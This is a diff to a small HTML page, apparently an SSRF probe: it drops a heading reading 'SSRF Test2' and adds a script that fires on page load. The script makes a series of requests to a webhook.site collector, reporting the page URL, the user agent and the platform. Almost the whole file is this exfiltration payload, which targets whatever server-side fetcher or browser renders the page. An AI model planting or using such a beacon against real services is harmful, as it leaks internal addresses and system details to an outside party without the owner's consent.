@@ -1,9 +1,22 @@
 <html>
 <body>
-<h1>SSRF Test2</h1>
 
 <script>
-fetch("https://webhooksite.net/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/test")
+
+async function send(){
+  await fetch("https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/start");
+
+  await fetch("https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/?url="+encodeURIComponent(location.href));
+
+  await fetch("https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/?ua="+encodeURIComponent(navigator.userAgent));
+
+  await fetch("https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/?platform="+encodeURIComponent(navigator.platform));
+
+  await fetch("https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/end");
+}
+
+send();
+
 </script>
 
 </body>
